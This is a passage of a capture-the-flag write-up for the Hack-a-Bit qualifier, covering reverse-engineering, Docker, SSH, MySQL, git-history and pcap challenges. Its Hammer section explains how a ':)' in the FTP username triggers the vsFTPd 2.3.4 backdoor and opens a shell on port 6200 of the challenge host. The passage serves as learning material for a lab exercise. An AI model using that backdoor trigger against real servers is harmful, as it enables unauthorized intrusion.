&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;What is the entry point of this binary (like 0x1070)?: &amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fgets&lt;/span&gt;(s1, &lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt;, _bss_start);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s1[&lt;span style=&#34;color:#a6e22e&#34;&gt;strcspn&lt;/span&gt;(s1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v23 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3735928559LL&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strcmp&lt;/span&gt;(s1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0x1100&amp;#34;&lt;/span&gt;) )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;That&amp;#39;s not right?? :(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Yeah I guess you got it... but whatever man!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We see that &lt;code&gt;s&lt;/code&gt; seems to be the flag, and it seems to be made of some hex strings in the variables &lt;code&gt;v6&lt;/code&gt;, &lt;code&gt;v7&lt;/code&gt;, &lt;code&gt;v8&lt;/code&gt;. However, each byte of &lt;code&gt;s&lt;/code&gt; is changed to &lt;code&gt;~s[i]&lt;/code&gt;, which is bitwise negation/NOT operator.&lt;/p&gt;
&lt;p&gt;Since &lt;code&gt;~~s = s&lt;/code&gt;, we can just bitwise NOT it again and get the flag.&lt;/p&gt;

  &lt;img src=&#34;./img/not.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Accounting for endianness by rearranging the string &lt;code&gt;ohw{galf_staht_atttttola}setyb_a&lt;/code&gt; gives &lt;code&gt;flag{whoa_thats_alottttta_bytes}&lt;/code&gt;. Didn&amp;rsquo;t need to run the binary to get the flag I guess.&lt;/p&gt;
&lt;h1 id=&#34;4-infrastructure&#34;&gt;4. Infrastructure&lt;/h1&gt;
&lt;h2 id=&#34;captain-75&#34;&gt;Captain (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Cloud infrastructure is migrating to containerized technology in many places, lets get started with containers. Run this docker container with the environment variable &lt;code&gt;FLAG_ENABLER&lt;/code&gt; set to &lt;code&gt;give_me_the_flag&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container1&#34;&gt;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container1&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Initially I tried to pull the image and analyse it, but gave up quickly and realised doing it properly was easier. Use &lt;code&gt;-e&lt;/code&gt; flag to set enviroment variables.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo docker run -e FLAG_ENABLER=give_me_the_flag nathanielsinger/hackabit0x01-infrastructure-container1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{you_aren&#39;t_the_captain_just_yet}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/docker1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;seashell&#34;&gt;Seashell&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;SSH runs the internet. Connect to &lt;code&gt;utkwrgubhj.qualifier.hackabit.com&lt;/code&gt; on port &lt;code&gt;22&lt;/code&gt; with user &lt;code&gt;hackerman&lt;/code&gt; and the provided &lt;code&gt;private key&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I did this on MacOS, by importing the key, but here is it again on linux (WSL). Private key file is called &lt;code&gt;id_rsa&lt;/code&gt;. Note that for the private key file, the permissions cannot be too open, so you have to use &lt;code&gt;chmod 400 id_rsa&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Connecting with &lt;code&gt;ssh -i id_rsa hackerman@utkwrgubhj.qualifier.hackabit.com&lt;/code&gt; we get the flag &lt;code&gt;flag{shesellsseashellsbytheseaaaaaaashore}&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/ssh.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;loading-100&#34;&gt;Loading (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What&amp;rsquo;s in this ISO thing?
&lt;a href=&#34;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container1&#34;&gt;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container1&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ok we are given like no info, let&amp;rsquo;s dump the image with &lt;code&gt;docker save -o dockerimage.tar nathanielsinger/hackabit0x01-infrastructure-container1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then just untar (&lt;code&gt;tar -xvf FILE.tar&lt;/code&gt;) the entire thing, and search through folders. Eventually in &lt;code&gt;adb6d&lt;/code&gt;&amp;hellip;. I found the flag in &lt;code&gt;root/flag_image.iso&lt;/code&gt; after untarring &lt;code&gt;layer.tar&lt;/code&gt; in the folder.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{consider_it_loaded_hackerman}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/docker2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;location-100&#34;&gt;Location (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Now with the same image, dive on in and find the iso image. What is the absolute path to the iso image stored within the container? Include the filename in the path for your submission.
&lt;a href=&#34;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container1&#34;&gt;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container1&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To be honest I forgot what the flag to this was, but it&amp;rsquo;s linked to the previous challenge, and we just specify the path to the &lt;code&gt;.iso&lt;/code&gt; image. So it would&amp;rsquo;ve been something like &lt;code&gt;root/flag_image.iso&lt;/code&gt; or &lt;code&gt;/root/flag_image.iso&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;connector-125&#34;&gt;Connector (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Connect to the mysql server at dyxvqmjwaj.qualifier.hackabit.com and read out the flag. Here are some user accounts:
&lt;code&gt;user1:uyqhxgxcxd&lt;/code&gt; &lt;code&gt;user2:ehaigdexhh&lt;/code&gt; &lt;code&gt;user3:xfgyuvtapt&lt;/code&gt; &lt;code&gt;user4:tnvgijqxei&lt;/code&gt; &lt;code&gt;user5:hybplwmndy&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given 5 user credentials. On my Mac, using SQL Workbench, I tried each one and checked the tables until I found a flag in one of them (&lt;code&gt;user4&lt;/code&gt;).&lt;/p&gt;

  &lt;img src=&#34;./img/connect.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;



  &lt;img src=&#34;./img/sqlflag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And we get the flag &lt;code&gt;flag{oh_sql_my_sql}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;boat-125&#34;&gt;Boat (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Sometimes we need to run a machine on a specific address or virtualize a network, get this running on: &lt;code&gt;172.22.1.11.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container2&#34;&gt;https://hub.docker.com/r/nathanielsinger/hackabit0x01-infrastructure-container2&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Seems easy enough, just run another docker command. But this time, we get an error when we try to pull the image.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Error response from daemon: manifest for nathanielsinger/hackabit0x01-infrastructure-container2:latest not found: manifest unknown: manifest unknown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Searching for the error brings us to &lt;a href=&#34;https://stackoverflow.com/questions/41810104/docker-manifest-unknown-manifest-unknown&#34;&gt;this&lt;/a&gt; stack overflow question, and we see we have to specify the version of the image. So we do so and &lt;code&gt;docker pull nathanielsinger/hackabit0x01-infrastructure-container2:v1.0.0&lt;/code&gt; works.&lt;/p&gt;
&lt;p&gt;Using yet another &lt;a href=&#34;https://stackoverflow.com/questions/27937185/assign-static-ip-to-docker-container&#34;&gt;article&lt;/a&gt; we use the command &lt;code&gt;docker network create --subnet=172.22.1.11/16 net1&lt;/code&gt; to make a network and &lt;code&gt;docker run --net net1 --ip 172.22.1.11 nathanielsinger/hackabit0x01-infrastructure-container2:v1.0.0&lt;/code&gt; to run the container with that network and correct ip.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{its_just_an_address_man}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/docker3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;inspector-150&#34;&gt;Inspector (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Oh look its Bits, something changed though&amp;hellip; see if you can track it down.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are provided with a zip file containing source code for what seems to be the Bits bot on the CTF&amp;rsquo;s discord server. After looking around, I realise we are given a git folder which contains &lt;code&gt;.git&lt;/code&gt; folder, with things like past commits and versions.&lt;/p&gt;
&lt;p&gt;So the flag must be somewhere in the past commits.&lt;/p&gt;
&lt;p&gt;Searching for &lt;code&gt;flag&lt;/code&gt; with &lt;code&gt;grep -r &amp;quot;flag&amp;quot; .&lt;/code&gt; we find past commits with &lt;code&gt;flag_stuff&lt;/code&gt; in their info.&lt;/p&gt;

  &lt;img src=&#34;./img/git1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;So we use &lt;code&gt;git checkout &amp;lt;flagcommithash&amp;gt;&lt;/code&gt; to switch to that commit, and another grep reveals the flag.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{don&#39;t_try_harder...look_harder}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/git2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;hammer-150&#34;&gt;Hammer (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out oslyxpzcgs.qualifier.hackabit.com and see if you can find the vuln. No help on this one, nothing crazy though&amp;hellip; enumerate harder :)
The flag is stored in an environment variable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s nmap the domain to find more info about the service.&lt;/p&gt;

  &lt;img src=&#34;./img/nmap.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;We find an open port &lt;code&gt;21&lt;/code&gt; which is TCP, so let&amp;rsquo;s connect using netcat:&lt;/p&gt;

  &lt;img src=&#34;./img/vsftp.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;We see it is running &lt;code&gt;vsFTPd 2.3.4&lt;/code&gt;, and a quick google search reveals that it has a &lt;a href=&#34;https://en.wikipedia.org/wiki/Vsftpd&#34;&gt;smiley face backdoor&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, it is intended that we use Metasploit to automatically solve this, but I did it manually while booting up a linux computer to run Metasploit.&lt;/p&gt;
&lt;p&gt;First I found the source code for the Metasploit module &lt;a href=&#34;https://www.exploit-db.com/exploits/49757&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Essentially, if you include &lt;code&gt;:)&lt;/code&gt; in your username, a reverse shell will be sent to you at port 6200. So we do so, and connect at port 6200 for a shell.&lt;/p&gt;

  &lt;img src=&#34;./img/ftp1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And we check the enviroment variables for the flag. &lt;code&gt;flag{looks_like_you_found_the_right_nail}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/revshell.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h1 id=&#34;5-networking&#34;&gt;5. Networking&lt;/h1&gt;
&lt;h2 id=&#34;phonebook-75&#34;&gt;Phonebook (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out the DNS records for &lt;code&gt;qualifier.hackabit.com&lt;/code&gt;&amp;hellip; there&amp;rsquo;s soemthing interesting there, all kinds of data&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Okay let&amp;rsquo;s go to &lt;a href=&#34;https://dnschecker.org/all-dns-records-of-domain.php&#34;&gt;dnschecker.org&lt;/a&gt; and check the DNS records.&lt;/p&gt;

  &lt;img src=&#34;./img/dns.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Wow! A flag! Who would&amp;rsquo;ve guessed&amp;hellip; &lt;code&gt;flag{my_nameserver_is_slimshady}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;avenue-75&#34;&gt;Avenue (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What is the kernel(OS) was this network capture recorded on?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a &lt;code&gt;pcap&lt;/code&gt; capture file. Let&amp;rsquo;s use wireshark to open it.&lt;/p&gt;

  &lt;img src=&#34;./img/wireshark.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And within one of the tls streams we find &lt;code&gt;X11; Ubuntu; Linux x86_64&lt;/code&gt; to be the OS of the capturing device.&lt;/p&gt;
&lt;h2 id=&#34;rivers-100&#34;&gt;Rivers (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Follow the river and see whats in the stream.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Okay, so this was also just following the TLS stream, hence the name and description. The flag is in the previous image too, &lt;code&gt;flag{rivers_run_streams_flowwww}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;fish-100&#34;&gt;Fish (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What protocol is responsible for the most packets in this capture?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sorting by protocol, we find the &lt;code&gt;QUIC&lt;/code&gt; protocol to be most of the packets.&lt;/p&gt;
&lt;p&gt;But submitting that doesn&amp;rsquo;t give us the flag. A quick google brings us to its full name, &lt;code&gt;Quick UDP Internet Connections&lt;/code&gt;, which I don&amp;rsquo;t think was the flag either? It was something like &lt;code&gt;QUIC IETF&lt;/code&gt; or so.&lt;/p&gt;
&lt;h2 id=&#34;school-125&#34;&gt;School (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This ones gonna take a few steps:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Take the input line by line
Calculate the network and broadcast addresses of the subnet
For each network address add up all the forth octets
Your challenge response (flag) is this total.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Okay, I literally chucked this challenge into chat GPT to solve it for me, and it actually worked first try!&lt;/p&gt;
&lt;p&gt;It gave me this code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_network_address&lt;/span&gt;(ip, netmask):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ip_parts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    netmask_parts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; netmask&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    network_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ip_parts[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; netmask_parts[i] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(str(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; network_address)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_broadcast_address&lt;/span&gt;(ip, netmask):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ip_parts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    netmask_parts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; int(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; netmask&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    broadcast_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ip_parts[i] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; netmask_parts[i] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(str(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; broadcast_address)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;school.txt&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(filename) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        lines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readlines()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sum_of_fourth_octets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; line &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; lines:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ip, mask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            netmask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([str((&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; int(mask))) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            network_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_network_address(ip, netmask)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            broadcast_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_broadcast_address(ip, netmask)
